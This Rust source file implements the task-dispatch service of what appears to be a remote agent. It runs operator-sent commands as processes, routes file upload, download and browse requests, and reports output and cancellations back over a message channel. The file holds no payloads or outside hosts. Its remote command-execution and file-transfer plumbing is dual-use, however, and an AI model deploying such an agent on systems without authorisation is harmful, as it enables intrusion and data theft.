//! Task Service - task execution

use crate::kernel::Plugin;
use crate::ops::{spawn_operation, terminate_process, AgentConfig};
use crate::protocol::{AgentMessage, AgentTaskStatus};
use std::collections::HashMap;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc::Sender,
    Arc, Mutex,
};

pub struct TaskService {
    running: Arc<Mutex<HashMap<String, RunningTaskHandle>>>,
    sender: Sender<AgentMessage>,
}

#[derive(Clone)]
struct RunningTaskHandle {
    pid: Arc<Mutex<Option<u32>>>,
    cancel_requested: Arc<AtomicBool>,
    killed: Arc<AtomicBool>,
}

impl TaskService {
    pub fn new(config: AgentConfig, sender: Sender<AgentMessage>) -> Self {
        let _ = config;
        Self {
            running: Arc::new(Mutex::new(HashMap::new())),
            sender,
        }
    }

    pub fn dispatch(&mut self, task_id: &str, command: &str, payload: Option<&str>) {
        // Route built-in file operations to dedicated handler
        if super::file_ops::is_file_op(command) {
            let sender = self.sender.clone();
            let tid = task_id.to_string();
            let cmd = command.to_string();
            let pay = payload.map(String::from);

            std::thread::spawn(move || {
                match cmd.as_str() {
                    "upload" => {
                        if let Some(p) = pay.as_deref() {
                            super::file_ops::handle_upload(&tid, p, &sender);
                        } else {
                            let _ = sender.send(AgentMessage::TaskResult {
                                task_id: tid,
                                success: false,
                                output: "upload requires payload".to_string(),
                            });
                        }
                    }
                    "download" => {
                        super::file_ops::handle_download(
                            &tid,
                            pay.as_deref().unwrap_or(""),
                            &sender,
                        );
                    }
                    "browse" => {
                        super::file_ops::handle_browse(
                            &tid,
                            pay.as_deref().unwrap_or(""),
                            &sender,
                        );
                    }
                    _ => unreachable!(),
                }
            });
            return;
        }

        // Route built-in system operations to dedicated handler
        if super::sys_ops::is_sys_op(command) {
            let sender = self.sender.clone();
            let tid = task_id.to_string();
            let cmd = command.to_string();

            std::thread::spawn(move || {
                super::sys_ops::handle(&tid, &cmd, &sender);
            });
            return;
        }

        let running = Arc::clone(&self.running);
        let sender = self.sender.clone();
        let tid = task_id.to_string();
        let cmd = command.to_string();
        let pay = payload.map(String::from);
        let handle = RunningTaskHandle {
            pid: Arc::new(Mutex::new(None)),
            cancel_requested: Arc::new(AtomicBool::new(false)),
            killed: Arc::new(AtomicBool::new(false)),
        };

        self.running
            .lock()
            .unwrap()
            .insert(tid.clone(), handle.clone());

        std::thread::spawn(move || {
            let child = match spawn_operation(&cmd, pay.as_deref(), None) {
                Ok(child) => child,
                Err(_) => {
                    running.lock().unwrap().remove(&tid);
                    let _ = sender.send(AgentMessage::TaskResult {
                        task_id: tid.clone(),
                        success: false,
                        output: "exec failed".to_string(),
                    });
                    return;
                }
            };

            let pid = child.id();
            *handle.pid.lock().unwrap() = Some(pid);
            let _ = sender.send(AgentMessage::TaskUpdate {
                task_id: tid.clone(),
                status: AgentTaskStatus::Running,
                output: None,
            });

            if handle.cancel_requested.load(Ordering::SeqCst) && terminate_process(pid) {
                handle.killed.store(true, Ordering::SeqCst);
            }

            let result = child.wait_with_output();
            running.lock().unwrap().remove(&tid);

            match result {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                    let merged = if err_is_empty(&stderr) {
                        stdout
                    } else if stdout.trim().is_empty() {
                        stderr
                    } else {
                        format!("{stdout}\n{stderr}")
                    };
                    let merged = merged.trim().to_string();

                    if handle.killed.load(Ordering::SeqCst) {
                        let output = if merged.is_empty() {
                            Some("cancelled by operator".to_string())
                        } else {
                            Some(format!("cancelled by operator\n{merged}"))
                        };
                        let _ = sender.send(AgentMessage::TaskUpdate {
                            task_id: tid.clone(),
                            status: AgentTaskStatus::Cancelled,
                            output,
                        });
                    } else {
                        let success = output.status.code().unwrap_or(-1) == 0;
                        let _ = sender.send(AgentMessage::TaskResult {
                            task_id: tid.clone(),
                            success,
                            output: merged,
                        });
                    }
                }
                Err(_) => {
                    let _ = sender.send(AgentMessage::TaskResult {
                        task_id: tid.clone(),
                        success: false,
                        output: "exec failed".to_string(),
                    });
                }
            }
        });
    }

    pub fn cancel(&mut self, task_id: &str) {
        let handle = self.running.lock().unwrap().get(task_id).cloned();
        let Some(handle) = handle else {
            return;
        };
        handle.cancel_requested.store(true, Ordering::SeqCst);
        let pid = *handle.pid.lock().unwrap();
        if let Some(pid) = pid {
            if terminate_process(pid) {
                handle.killed.store(true, Ordering::SeqCst);
            }
        }
    }

    pub fn count(&self) -> usize {
        self.running.lock().unwrap().len()
    }
}

impl Plugin for TaskService {
    fn name(&self) -> &'static str {
        "task"
    }
}

fn err_is_empty(stderr: &str) -> bool {
    stderr.trim().is_empty()
}
